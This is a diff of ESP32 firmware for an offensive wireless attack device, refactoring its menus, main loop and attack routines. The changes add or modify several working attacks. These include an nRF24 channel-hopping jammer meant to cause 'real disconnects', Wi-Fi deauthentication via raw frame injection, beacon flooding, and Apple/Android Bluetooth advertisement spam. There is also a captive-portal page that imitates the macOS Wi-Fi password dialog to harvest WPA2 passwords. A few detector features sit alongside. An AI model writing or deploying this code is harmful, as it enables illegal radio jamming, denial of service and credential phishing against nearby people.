@@ -2973,28 +3764,31 @@ void handleBLEMenuTouch(int x, int y) {
   
   int startY = HEADER_HEIGHT + 10;
   
-  if (y >= startY && y < startY + (4 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
+  if (y >= startY && y < startY + (5 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
     int relativeY = y - startY;
     int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
     
     int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
     if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
       switch (buttonIndex) {
-        case 0:
-          scanBLEDevices();
-          break;
-        case 1:
-          currentState = BLE_JAM_MENU;
+        case 0:  // nRF24 Jammer - Real disconnect
+          currentState = NRF_JAM_MENU;
           hoveredIndex = -1;
-          drawBLEJammerMenu();
+          drawNRFJammerMenu();
           break;
-        case 2:
+        case 1:  // Apple/Android Spam
           currentState = SPAM_MENU;
           hoveredIndex = -1;
           drawSpamMenu();
           break;
-        case 3:
+        case 2:  // Scan BLE
+          scanBLEDevices();
+          break;
+        case 3:  // AirTag Scan
           startAirTagScanner();
+          break;
+        case 4:  // Skimmer Detect
+          startSkimmerDetector();
           break;
       }
     }
@@ -3024,54 +3818,8 @@ void handleBLEJamMenuTouch(int x, int y) {
 
 void handleNRFJamMenuTouch(int x, int y) {
   if (y > 300) {
+    // Back button pressed
     if (nrfJammerActive) stopNRFJammer();
-    currentState = BLE_MENU;
-    hoveredIndex = -1;
-    drawBLEMenu();
-    return;
-  }
-  
-  int startY = HEADER_HEIGHT + 10;
-  
-  if (y >= startY && y < startY + (2 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
-    int relativeY = y - startY;
-    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
-    
-    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
-    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
-      switch (buttonIndex) {
-        case 0:
-          if (!nrfJammerActive) {
-            startNRFJammer();
-          } else {
-            stopNRFJammer();
-            drawNRFJammerMenu();
-          }
-          break;
-          
-        case 1:
-          if (nrf1Available && nrf2Available) {
-            dualNRFMode = !dualNRFMode;
-            addToConsole(dualNRFMode ? "Dual mode ON" : "Single mode");
-          } else {
-            addToConsole("ERROR: Need 2 radios");
-          }
-          drawNRFJammerMenu();
-          break;
-      }
-    }
-  }
-}
-
-void handleSpamMenuTouch(int x, int y) {
-  if (y > 300) {
-    if (appleSpamActive || androidSpamActive) {
-      if (BLEDevice::getInitialized()) {
-        BLEDevice::deinit(false);
-      }
-      appleSpamActive = false;
-      androidSpamActive = false;
-    }
     currentState = BLE_MENU;
     hoveredIndex = -1;
     drawBLEMenu();
@@ -3087,44 +3835,95 @@ void handleSpamMenuTouch(int x, int y) {
     int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
     if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
       switch (buttonIndex) {
-        case 0:
-          appleSpamActive = !appleSpamActive;
-          if (appleSpamActive) {
-            if (androidSpamActive) {
-              androidSpamActive = false;
-              if (BLEDevice::getInitialized()) BLEDevice::deinit(false);
-              delay(100);
-            }
-            BLEDevice::init("P4WNC4K3");
-            pAdvertising = BLEDevice::getAdvertising();
-            addToConsole("Apple spam started");
+        case 0:  // Start/Stop Jammer
+          if (!nrfJammerActive) {
+            startNRFJammer();
           } else {
-            BLEDevice::deinit(false);
-            addToConsole("Apple spam stopped");
+            stopNRFJammer();
+            drawNRFJammerMenu();
+          }
+          break;
+          
+        case 1:  // Toggle Dual Mode
+          if (nrf1Available && nrf2Available) {
+            dualNRFMode = !dualNRFMode;
+            addToConsole(dualNRFMode ? "Dual mode ON" : "Single mode");
+            Serial.printf("[*] Dual mode: %s\n", dualNRFMode ? "ON" : "OFF");
+          } else {
+            addToConsole("ERROR: Need 2 radios");
+            Serial.println("[!] Need 2 radios for dual mode");
+          }
+          drawNRFJammerMenu();
+          break;
+          
+        case 2:  // Cycle Mode (NEW)
+          // Cycle through modes: SWEEP -> RANDOM -> FOCUSED -> SWEEP
+          nrfJamMode = (NRFJamMode)((nrfJamMode + 1) % 3);
+          
+          const char* modeName = "";
+          switch (nrfJamMode) {
+            case NRF_SWEEP:   modeName = "SWEEP (Smoochiee)"; break;
+            case NRF_RANDOM:  modeName = "RANDOM"; break;
+            case NRF_FOCUSED: modeName = "FOCUSED (BLE)"; break;
+          }
+          
+          addToConsole(String("Mode: ") + modeName);
+          Serial.printf("[*] Jamming mode: %s\n", modeName);
+          
+          // If jammer is active, reset counters for new mode
+          if (nrfJammerActive) {
+            // Reset sweep pattern
+            flag_radio1 = 0;
+            flag_radio2 = 0;
+            nrf_ch1 = 2;
+            nrf_ch2 = 45;
+          }
+          
+          drawNRFJammerMenu();
+          break;
+      }
+    }
+  }
+}
+
+void handleSpamMenuTouch(int x, int y) {
+  if (y > 300) {
+    // Clean stop
+    if (appleSpamActive) stopAppleSpam();
+    if (androidSpamActive) stopAndroidSpam();
+    
+    currentState = BLE_MENU;
+    hoveredIndex = -1;
+    drawBLEMenu();
+    return;
+  }
+  
+  int startY = HEADER_HEIGHT + 10;
+  
+  if (y >= startY && y < startY + (2 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
+    int relativeY = y - startY;
+    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
+    
+    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
+    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
+      switch (buttonIndex) {
+        case 0:  // Apple Spam
+          if (!appleSpamActive) {
+            if (androidSpamActive) stopAndroidSpam();
+            startAppleSpam();
+          } else {
+            stopAppleSpam();
           }
           drawSpamMenu();
           break;
           
-        case 1:
-          androidSpamActive = !androidSpamActive;
-          if (androidSpamActive) {
-            if (appleSpamActive) {
-              appleSpamActive = false;
-              if (BLEDevice::getInitialized()) BLEDevice::deinit(false);
-              delay(100);
-            }
-            BLEDevice::init("P4WNC4K3");
-            pAdvertising = BLEDevice::getAdvertising();
-            addToConsole("Android spam started");
+        case 1:  // Android Spam
+          if (!androidSpamActive) {
+            if (appleSpamActive) stopAppleSpam();
+            startAndroidSpam();
           } else {
-            BLEDevice::deinit(false);
-            addToConsole("Android spam stopped");
+            stopAndroidSpam();
           }
-          drawSpamMenu();
-          break;
-          
-        case 2:
-          addToConsole("Windows spam coming soon");
           drawSpamMenu();
           break;
       }
@@ -3142,20 +3941,25 @@ void handleMoreToolsTouch(int x, int y) {
   
   int startY = HEADER_HEIGHT + 10;
   
-  if (y >= startY && y < startY + (3 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
+  if (y >= startY && y < startY + (4 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {  // Changed from 3 to 4
     int relativeY = y - startY;
     int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
     
     int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
     if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
       switch (buttonIndex) {
-        case 0:
+        case 0:  // Deauth Sniffer
+          currentState = DEAUTH_SNIFFER;
+          hoveredIndex = -1;
+          drawDeauthSnifferMenu();
+          break;
+        case 1:  // Skimmer Detect
           startSkimmerDetector();
           break;
-        case 1:
+        case 2:  // Wardriving
           startWardriving();
           break;
-        case 2:
+        case 3:  // Console
           showConsole();
           break;
       }
@@ -3278,43 +4082,118 @@ void handleAttackMenuTouch(int x, int y) {
 void loop() {
   esp_task_wdt_reset();
   
-  // Heap monitoring
-  static unsigned long lastHeapCheck = 0;
-  if (millis() - lastHeapCheck > 10000) {
-    if (ESP.getFreeHeap() < 20000) {
-      addToConsole("WARN: Low memory!");
-      Serial.printf("⚠️  Free heap: %d bytes\n", ESP.getFreeHeap());
+  // ==================== TURBO MODE: nRF24 JAMMER ONLY ====================
+  if (nrfJammerActive && nrfTurboMode) {
+    // ⚡ CRITICAL: ONLY jamming + minimal touch checking
+    
+    // Ultra-fast touch check: only every 5000 hops (~50ms at 100K/sec)
+    static uint32_t lastTouchCheck = 0;
+    if ((nrfJamPackets - lastTouchCheck) > 5000) {
+      uint16_t touchX, touchY;
+      // Single fast check - no delay, no verification
+      if (tft.getTouch(&touchX, &touchY)) {
+        // ANY touch stops jammer
+        stopNRFJammer();
+        currentState = NRF_JAM_MENU;
+        hoveredIndex = -1;
+        drawNRFJammerMenu();
+        return;
+      }
+      lastTouchCheck = nrfJamPackets;
     }
-    lastHeapCheck = millis();
+    
+    // Route to selected jamming mode (INLINE for speed)
+    switch (nrfJamMode) {
+      case NRF_SWEEP:
+        // ⭐ SMOOCHIEE'S SWEEP PATTERN (INLINE)
+        if (flag_radio1 == 0) nrf_ch1 += 4; else nrf_ch1 -= 4;
+        if (flag_radio2 == 0) nrf_ch2 += 2; else nrf_ch2 -= 2;
+        
+        if ((nrf_ch1 > 79) && (flag_radio1 == 0)) flag_radio1 = 1;
+        else if ((nrf_ch1 < 2) && (flag_radio1 == 1)) flag_radio1 = 0;
+        
+        if ((nrf_ch2 > 79) && (flag_radio2 == 0)) flag_radio2 = 1;
+        else if ((nrf_ch2 < 2) && (flag_radio2 == 1)) flag_radio2 = 0;
+        
+        if (nrf1Available) { radio1.setChannel(nrf_ch1); SAFE_INCREMENT(nrf1Packets); }
+        if (nrf2Available && dualNRFMode) { radio2.setChannel(nrf_ch2); SAFE_INCREMENT(nrf2Packets); }
+        break;
+        
+      case NRF_RANDOM:
+        if (nrf1Available) { radio1.setChannel(random(80)); SAFE_INCREMENT(nrf1Packets); }
+        if (nrf2Available && dualNRFMode) { radio2.setChannel(random(80)); SAFE_INCREMENT(nrf2Packets); }
+        break;
+        
+      case NRF_FOCUSED:
+        if (nrf1Available) {
+          ptr_hop1 = (ptr_hop1 + 1) % 24;
+          radio1.setChannel(hopping_channel[ptr_hop1]);
+          SAFE_INCREMENT(nrf1Packets);
+        }
+        if (nrf2Available && dualNRFMode) {
+          ptr_hop2 = (ptr_hop2 + 1) % 24;
+          radio2.setChannel(hopping_channel[ptr_hop2]);
+          SAFE_INCREMENT(nrf2Packets);
+        }
+        break;
+    }
+    
+    // Update total count (thread-safe)
+    uint32_t packets1, packets2;
+    SAFE_READ(nrf1Packets, packets1);
+    SAFE_READ(nrf2Packets, packets2);
+    nrfJamPackets = packets1 + packets2;
+    
+    // Watchdog every 5000 hops
+    if ((nrfJamPackets % 5000) == 0) {
+      esp_task_wdt_reset();
+    }
+    
+    // Stats every 100K hops
+    if ((nrfJamPackets % 100000) == 0 && millis() - nrfLastStats > 1000) {
+      nrfLastStats = millis();
+      unsigned long runtime = (millis() - lastNRFJamTime) / 1000;
+      if (runtime > 0) {
+        unsigned long hopsPerSec = nrfJamPackets / runtime;
+        Serial.printf("[nRF24] %lu hops | %lu/sec | R1:%lu R2:%lu\n", 
+                      nrfJamPackets, hopsPerSec, packets1, packets2);
+        
+        if (hopsPerSec > 50000) Serial.println("        ✓ EXCELLENT");
+        else if (hopsPerSec > 30000) Serial.println("        ✓ VERY GOOD");
+        else if (hopsPerSec > 15000) Serial.println("        ✓ GOOD");
+        else Serial.println("        ⚠ Check hardware");
+      }
+    }
+    
+    // ⚡ NO DELAYS! Return immediately
+    return;
   }
-
-  // ===== REAL-TIME ATTACK MODE UPDATES =====
+  
+  // ==================== NORMAL MODE: Full UI + Features ====================
+  checkHeapHealth();
+  
+  // Real-time attack updates
   if (currentState == WIFI_ATTACK_MENU) {
     static unsigned long lastAttackUpdate = 0;
-    // Update every 200ms for smooth real-time display
     if (millis() - lastAttackUpdate > 200) {
       updateAttackMenuLive();
       lastAttackUpdate = millis();
     }
   }
-
-  // ===== CAPTURED PASSWORDS LIVE UPDATE =====
+  
   if (currentState == CAPTURED_PASSWORDS) {
     static unsigned long lastPwdUpdate = 0;
     static int lastCredCount = 0;
-    // Update if count changed OR every 2 seconds
     if (capturedCredCount != lastCredCount || millis() - lastPwdUpdate > 2000) {
       displayCapturedPasswords();
       lastCredCount = capturedCredCount;
       lastPwdUpdate = millis();
     }
   }
-
-  // ===== HANDSHAKE CAPTURE LIVE UPDATE =====
+  
   if (currentState == HANDSHAKE_CAPTURE) {
     static unsigned long lastHandshakeUpdate = 0;
     static bool wasCapture = false;
-    // Update every 300ms OR immediately when handshake captured
     if (millis() - lastHandshakeUpdate > 300 || 
         (capturedHandshake.captured && !wasCapture)) {
       displayHandshakeCapture();
@@ -3322,10 +4201,16 @@ void loop() {
       lastHandshakeUpdate = millis();
     }
   }
-
-  // ===== LIVE SCANNING UPDATES =====
   
-  // AirTag Scanner
+  // Live scanning updates
+  if (currentState == DEAUTH_SNIFFER_ACTIVE) {
+    static unsigned long lastDeauthUpdate = 0;
+    if (millis() - lastDeauthUpdate > 500) {
+      displayDeauthSnifferActive();
+      lastDeauthUpdate = millis();
+    }
+  }
+  
   if (currentState == AIRTAG_SCANNER || currentState == AIRTAG_RESULTS) {
     static unsigned long lastAirTagUpdate = 0;
     if (millis() - lastAirTagUpdate > 1000) {
@@ -3334,7 +4219,6 @@ void loop() {
     }
   }
   
-  // Skimmer Detector
   if (currentState == SKIMMER_DETECTOR || currentState == SKIMMER_RESULTS) {
     static unsigned long lastSkimmerUpdate = 0;
     if (millis() - lastSkimmerUpdate > 1000) {
@@ -3343,7 +4227,6 @@ void loop() {
     }
   }
   
-  // Wardriving
   if (currentState == WARDRIVING_MODE) {
     static unsigned long lastWardrivingUpdate = 0;
     if (millis() - lastWardrivingUpdate > 1000) {
@@ -3352,10 +4235,8 @@ void loop() {
     }
   }
   
-  // WiFi Continuous Scan
   if (continuousWiFiScan && currentState == WIFI_SCAN) {
     processWiFiScanResults();
-    
     static unsigned long lastDisplayUpdate = 0;
     if (millis() - lastDisplayUpdate > 500) {
       displayContinuousWiFiScan();
@@ -3363,7 +4244,6 @@ void loop() {
     }
   }
   
-  // BLE Continuous Scan
   if (continuousBLEScan && currentState == BLE_SCAN_RESULTS) {
     if (millis() - lastBLEScanUpdate > 2000) {
       if (pBLEScan != nullptr) {
@@ -3384,26 +4264,35 @@ void loop() {
     }
   }
   
-  // Sniffer Active
   if (snifferActive && currentState == SNIFFER_ACTIVE) {
     static unsigned long lastSnifferUpdate = 0;
     if (millis() - lastSnifferUpdate > 500) {
       displaySnifferActive();
       lastSnifferUpdate = millis();
     }
+    
+    static bool lastCapturedState = false;
+    if (capturedHandshake.captured && !lastCapturedState) {
+      Serial.println("[+] FULL HANDSHAKE CAPTURED!");
+      addToConsole("Handshake captured!");
+      lastCapturedState = true;
+    }
+    if (!capturedHandshake.captured) {
+      lastCapturedState = false;
+    }
   }
   
-  // ===== TOUCH HANDLING =====
+  // Touch handling
   handleTouch();
   handleSerialCommands();
   
-  // ===== ANIMATIONS =====
+  // Animations
   if (showSkull && millis() - lastAnimTime > 50) {
     animateSkull();
     lastAnimTime = millis();
   }
   
-  // ===== ACTIVE ATTACKS =====
+  // Active attacks
   if (deauthActive) {
     performDeauth();
     delayMicroseconds(100);
@@ -3413,46 +4302,38 @@ void loop() {
     performBeaconFlood();
   }
   
-  if (appleSpamActive) {
-    performAppleSpam();
-  }
-  
-  if (androidSpamActive) {
-    performAndroidSpam();
-  }
-  
-  if (bleJammerActive) {
+  // BLE operations (only if nRF24 is OFF)
+  if (bleJammerActive && !nrfJammerActive) {
     performBLEJam();
-  }
-
-  if (nrfJammerActive) {
-    performNRFJam();
+    
+    if (currentState == BLE_JAM_ACTIVE) {
+      static unsigned long lastBLEJamDisplay = 0;
+      if (millis() - lastBLEJamDisplay > 500) {
+        updateBLEJammerDisplay();
+        lastBLEJamDisplay = millis();
+      }
+    }
   }
   
-  if (portalActive) {
+  // BLE Spam (only if nothing else active)
+  if (!nrfJammerActive && !bleJammerActive) {
+    if (appleSpamActive) performAppleSpam();
+    if (androidSpamActive) performAndroidSpam();
+  }
+  
+  // Captive portal (when not jamming)
+  if (portalActive && !bleJammerActive && !nrfJammerActive && !snifferActive) {
     dnsServer.processNextRequest();
     webServer.handleClient();
   }
   
-  // ===== JAMMER DISPLAYS (throttled) =====
-  if (bleJammerActive && currentState == BLE_JAM_ACTIVE) {
-    static unsigned long lastBLEJamDisplay = 0;
-    if (millis() - lastBLEJamDisplay > 500) {
-      updateBLEJammerDisplay();
-      lastBLEJamDisplay = millis();
-    }
-  }
-  
-  if (nrfJammerActive && currentState == NRF_JAM_ACTIVE) {
-    static unsigned long lastNRFJamDisplay = 0;
-    if (millis() - lastNRFJamDisplay > 500) {
-      updateNRFJammerDisplay();
-      lastNRFJamDisplay = millis();
-    }
-  }
+  delay(1);
 }
 
 void updateAttackMenuLive() {
+  static unsigned long lastUpdate = 0;
+  if (millis() - lastUpdate < 200) return;
+  lastUpdate = millis();
   // Only update if we're actually in the attack menu
   if (currentState != WIFI_ATTACK_MENU) return;
   
@@ -3682,17 +4563,46 @@ void startDeauth() {
     return;
   }
   
-  if (snifferActive) stopSniffer();
-  if (portalActive) stopCaptivePortal();
-  if (beaconFloodActive) beaconFloodActive = false;
+  // ✅ FIX: Stop conflicting operations with proper delays
+  if (snifferActive) {
+    stopSniffer();
+    delay(200);
+  }
+  if (portalActive) {
+    stopCaptivePortal();
+    delay(200);
+  }
+  if (beaconFloodActive) {
+    beaconFloodActive = false;
+    delay(100);
+  }
   
+  // ✅ FIX: Proper WiFi state machine
+  Serial.println("[*] Initializing WiFi for deauth...");
+  
+  // Step 1: Clean shutdown
   esp_wifi_stop();
+  delay(200);
+  esp_task_wdt_reset();
+  
+  // Step 2: Set mode to NULL first
+  WiFi.mode(WIFI_MODE_NULL);
   delay(100);
+  esp_task_wdt_reset();
+  
+  // Step 3: Set to AP mode
   WiFi.mode(WIFI_AP);
-  delay(100);
+  delay(200);
+  esp_task_wdt_reset();
+  
+  // Step 4: Start WiFi
   esp_wifi_start();
-  delay(100);
+  delay(200);
+  esp_task_wdt_reset();
+  
+  // Step 5: Set channel
   esp_wifi_set_channel(networks[targetIndex].channel, WIFI_SECOND_CHAN_NONE);
+  delay(100);
   
   deauthActive = true;
   deauthPacketsSent = 0;
@@ -3746,7 +4656,7 @@ void performDeauth() {
     };
     
     esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
-    deauthPacketsSent++;
+    SAFE_INCREMENT(deauthPacketsSent);
   }
   
   // METHOD 1: Storm Mode (burst attack)
@@ -3764,7 +4674,7 @@ void performDeauth() {
       
       esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
       delayMicroseconds(100);
-      deauthPacketsSent++;
+      SAFE_INCREMENT(deauthPacketsSent);
     }
   }
 }
@@ -4258,39 +5168,78 @@ void handlePortalRoot() {
   html += "<meta http-equiv='Cache-Control' content='no-cache, no-store, must-revalidate'>";
   html += "<style>";
   html += "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;";
-  html += "background:#f5f5f5;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;}";
-  html += ".container{background:white;padding:40px;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,0.08);max-width:400px;width:100%;}";
-  html += ".wifi-symbol{text-align:center;margin-bottom:20px;}";
-  html += ".wifi-icon{display:inline-block;width:50px;height:50px;border-radius:50%;background:#007AFF;position:relative;}";
-  html += ".wifi-icon::before{content:'';position:absolute;width:20px;height:20px;border:3px solid white;";
-  html += "border-top:none;border-right:none;border-radius:0 0 0 100%;left:15px;top:20px;transform:rotate(45deg);}";
-  html += ".wifi-icon::after{content:'';position:absolute;width:6px;height:6px;background:white;";
-  html += "border-radius:50%;left:22px;bottom:12px;}";
-  html += "h2{margin:0 0 8px;color:#000;font-size:22px;text-align:center;font-weight:600;}";
-  html += ".subtitle{color:#86868b;text-align:center;margin-bottom:30px;font-size:14px;}";
+  html += "background:#e5e5e5;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;}";
+  html += ".container{background:#f0f0f0;padding:0;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15);max-width:500px;width:100%;}";
+  html += ".header{background:linear-gradient(180deg,#d8d8d8 0%,#c8c8c8 100%);padding:20px;border-radius:12px 12px 0 0;";
+  html += "display:flex;align-items:center;gap:20px;border-bottom:1px solid #b0b0b0;}";
+  html += ".wifi-icon{width:70px;height:70px;display:flex;align-items:center;justify-content:center;}";
+  html += ".wifi-icon svg{width:60px;height:60px;}";
+  html += ".header-text{flex:1;}";
+  html += ".network-name{font-size:17px;font-weight:600;color:#000;margin:0 0 4px 0;}";
+  html += ".network-info{font-size:13px;color:#505050;margin:0;}";
+  html += ".content{padding:24px 30px 30px;}";
   html += ".form-group{margin-bottom:20px;}";
-  html += "label{display:block;color:#000;font-size:13px;font-weight:500;margin-bottom:6px;}";
-  html += "input{width:100%;padding:12px;border:1px solid #d2d2d7;border-radius:8px;box-sizing:border-box;";
-  html += "font-size:16px;background:#fff;}";
-  html += "input:focus{outline:none;border-color:#007AFF;}";
-  html += "button{width:100%;padding:14px;background:#007AFF;color:white;border:none;border-radius:8px;";
-  html += "font-size:16px;font-weight:500;cursor:pointer;margin-top:10px;}";
-  html += "button:active{background:#0051D5;}";
-  html += ".info{text-align:center;color:#86868b;font-size:12px;margin-top:20px;line-height:1.4;}";
+  html += "label{display:block;color:#000;font-size:13px;font-weight:500;margin-bottom:8px;text-align:right;display:flex;";
+  html += "align-items:center;gap:10px;}";
+  html += "label span{min-width:80px;text-align:right;}";
+  html += "input[type='password']{flex:1;padding:8px 12px;border:2px solid #a0a0a0;border-radius:6px;box-sizing:border-box;";
+  html += "font-size:15px;background:#fff;}";
+  html += "input[type='password']:focus{outline:none;border-color:#007AFF;box-shadow:0 0 0 3px rgba(0,122,255,0.2);}";
+  html += ".checkbox-group{display:flex;align-items:center;gap:8px;margin-bottom:12px;padding-left:90px;}";
+  html += "input[type='checkbox']{width:18px;height:18px;cursor:pointer;accent-color:#007AFF;}";
+  html += ".checkbox-label{font-size:13px;color:#000;user-select:none;cursor:pointer;}";
+  html += ".footer{display:flex;justify-content:space-between;align-items:center;padding:16px 30px;";
+  html += "background:linear-gradient(180deg,#e8e8e8 0%,#d8d8d8 100%);border-radius:0 0 12px 12px;border-top:1px solid #c0c0c0;}";
+  html += ".help-btn{width:28px;height:28px;border-radius:50%;background:#fff;border:1px solid #a0a0a0;";
+  html += "color:#007AFF;font-size:16px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;}";
+  html += ".action-btns{display:flex;gap:10px;}";
+  html += ".btn{padding:8px 20px;border-radius:6px;font-size:13px;font-weight:500;cursor:pointer;border:1px solid;}";
+  html += ".btn-cancel{background:#fff;border-color:#a0a0a0;color:#000;}";
+  html += ".btn-join{background:#007AFF;border-color:#007AFF;color:#fff;opacity:0.4;pointer-events:none;}";
+  html += ".btn-join.active{opacity:1;pointer-events:auto;}";
+  html += ".btn-join:active{background:#0051D5;}";
   html += "</style></head><body>";
   html += "<div class='container'>";
-  html += "<div class='wifi-symbol'><div class='wifi-icon'></div></div>";
-  html += "<h2>" + selectedSSID + "</h2>";
-  html += "<div class='subtitle'>Enter password to connect</div>";
-  html += "<form action='/post' method='post'>";
-  html += "<div class='form-group'>";
-  html += "<label>Password</label>";
-  html += "<input type='password' name='password' placeholder='Password' required autofocus>";
+  html += "<div class='header'>";
+  html += "<div class='wifi-icon'>";
+  html += "<svg viewBox='0 0 60 60' fill='none' xmlns='http://www.w3.org/2000/svg'>";
+  html += "<path d='M30 45 C32.5 45 35 42.5 35 40 C35 37.5 32.5 35 30 35 C27.5 35 25 37.5 25 40 C25 42.5 27.5 45 30 45Z' fill='#007AFF'/>";
+  html += "<path d='M30 30 C25 30 20 32.5 17 37' stroke='#007AFF' stroke-width='3' stroke-linecap='round' fill='none'/>";
+  html += "<path d='M30 30 C35 30 40 32.5 43 37' stroke='#007AFF' stroke-width='3' stroke-linecap='round' fill='none'/>";
+  html += "<path d='M30 20 C22 20 14 24 9 30' stroke='#007AFF' stroke-width='3' stroke-linecap='round' fill='none'/>";
+  html += "<path d='M30 20 C38 20 46 24 51 30' stroke='#007AFF' stroke-width='3' stroke-linecap='round' fill='none'/>";
+  html += "</svg>";
   html += "</div>";
-  html += "<button type='submit'>Join</button>";
-  html += "</form>";
-  html += "<div class='info'>Your device will automatically connect to this network in the future.</div>";
-  html += "</div></body></html>";
+  html += "<div class='header-text'>";
+  html += "<h2 class='network-name'>The Wi-Fi network \"" + selectedSSID + "\" requires a WPA2 password.</h2>";
+  html += "</div></div>";
+  html += "<form action='/post' method='post' id='wifiForm'>";
+  html += "<div class='content'>";
+  html += "<div class='form-group'>";
+  html += "<label><span>Password:</span>";
+  html += "<input type='password' name='password' id='password' required autofocus>";
+  html += "</label></div>";
+  html += "<div class='checkbox-group'>";
+  html += "<input type='checkbox' id='showPwd'>";
+  html += "<label for='showPwd' class='checkbox-label'>Show password</label>";
+  html += "</div>";
+  html += "<div class='checkbox-group'>";
+  html += "<input type='checkbox' id='remember' checked>";
+  html += "<label for='remember' class='checkbox-label'>Remember this network</label>";
+  html += "</div></div>";
+  html += "<div class='footer'>";
+  html += "<div class='help-btn'>?</div>";
+  html += "<div class='action-btns'>";
+  html += "<button type='button' class='btn btn-cancel' onclick='window.history.back()'>Cancel</button>";
+  html += "<button type='submit' class='btn btn-join' id='joinBtn'>Join</button>";
+  html += "</div></div></form></div>";
+  html += "<script>";
+  html += "const pwd=document.getElementById('password');";
+  html += "const show=document.getElementById('showPwd');";
+  html += "const join=document.getElementById('joinBtn');";
+  html += "show.addEventListener('change',()=>{pwd.type=show.checked?'text':'password';});";
+  html += "pwd.addEventListener('input',()=>{join.classList.toggle('active',pwd.value.length>0);});";
+  html += "</script></body></html>";
   
   webServer.send(200, "text/html", html);
 }
@@ -4420,11 +5369,25 @@ void displaySnifferActive() {
 // ==================== BLE Functions ====================
 
 void scanBLEDevices() {
+  Serial.println("\n========== STARTING BLE SCAN ==========");
+  
+  // ✅ FIX: Pause nRF24
+  bool wasNRFActive = nrfJammerActive;
+  if (nrfJammerActive) {
+    Serial.println("[*] Pausing nRF24 for BLE scan...");
+    nrfJammerActive = false;
+    delay(100);
+  }
+  
+  // Clean up any previous BLE operations
   if (bleJammerActive || appleSpamActive || androidSpamActive) {
     if (BLEDevice::getInitialized()) {
-      BLEDevice::deinit(false);
+      BLEDevice::deinit(true);
+      delay(200);
     }
-    delay(100);
+  } else if (BLEDevice::getInitialized()) {
+    BLEDevice::deinit(true);
+    delay(200);
   }
   
   addToConsole("BLE continuous scan started");
@@ -4438,11 +5401,12 @@ void scanBLEDevices() {
   
   continuousBLEScan = true;
   
-  // Display the screen FIRST
   displayBLEScanResults();
   
-  // THEN start the scan
   pBLEScan->start(0, nullptr, false);
+  
+  Serial.println("[+] BLE scan started");
+  Serial.println("=====================================\n");
 }
 
 void displayBLEScanResults() {
@@ -4525,19 +5489,144 @@ void displayBLEScanResults() {
 }
 
 // ==================== BLE JAMMER Functions ====================
+void initBLEJammer() {
+  // Pre-build advertisement spam packet
+  memset(adv_spam_packet, 0, sizeof(adv_spam_packet));
+  adv_spam_packet[0] = 0x02; // Length
+  adv_spam_packet[1] = 0x01; // Flags type
+  adv_spam_packet[2] = 0x06; // LE General Discoverable
+  
+  // Pre-build disconnect packet (LL_TERMINATE_IND)
+  memset(disconnect_packet, 0, sizeof(disconnect_packet));
+  disconnect_packet[0] = 0x02; // LL Control PDU
+  disconnect_packet[1] = 0x13; // Reason: Remote user terminated
+  
+  // Pre-build connection flood packet
+  memset(connect_flood_packet, 0, sizeof(connect_flood_packet));
+  connect_flood_packet[0] = 0x05; // CONNECT_IND
+}
+
+void forceResetBluetooth() {
+  Serial.println("[*] Force resetting Bluetooth stack...");
+  
+  // Step 1: Stop advertising if active
+  if (BLEDevice::getInitialized()) {
+    esp_ble_gap_stop_advertising();
+    delay(50);
+  }
+  
+  // Step 2: Deinit BLEDevice completely
+  if (BLEDevice::getInitialized()) {
+    BLEDevice::deinit(true);
+    delay(200);
+  }
+  
+  // Step 3: Force disable Bluedroid
+  for (int attempt = 0; attempt < 3; attempt++) {
+    esp_bluedroid_status_t bd_status = esp_bluedroid_get_status();
+    Serial.printf("  Bluedroid status: %d\n", bd_status);
+    
+    if (bd_status == ESP_BLUEDROID_STATUS_ENABLED) {
+      esp_err_t ret = esp_bluedroid_disable();
+      Serial.printf("  Bluedroid disable: %d\n", ret);
+      delay(100);
+    } else if (bd_status == ESP_BLUEDROID_STATUS_INITIALIZED) {
+      esp_err_t ret = esp_bluedroid_deinit();
+      Serial.printf("  Bluedroid deinit: %d\n", ret);
+      delay(100);
+    } else {
+      break; // Already uninitialized
+    }
+  }
+  
+  // Step 4: Force disable BT controller
+  for (int attempt = 0; attempt < 3; attempt++) {
+    esp_bt_controller_status_t status = esp_bt_controller_get_status();
+    Serial.printf("  BT controller status: %d\n", status);
+    
+    if (status == ESP_BT_CONTROLLER_STATUS_ENABLED) {
+      esp_err_t ret = esp_bt_controller_disable();
+      Serial.printf("  BT controller disable: %d\n", ret);
+      delay(100);
+    } else if (status == ESP_BT_CONTROLLER_STATUS_INITED) {
+      esp_err_t ret = esp_bt_controller_deinit();
+      Serial.printf("  BT controller deinit: %d\n", ret);
+      delay(100);
+    } else {
+      break; // Already idle
+    }
+  }
+  
+  delay(300); // Final settling time
+  Serial.println("[+] Bluetooth stack reset complete");
+}
 
 void startBLEJammer() {
   if (bleJammerActive) return;
   
-  bleJammerActive = true;
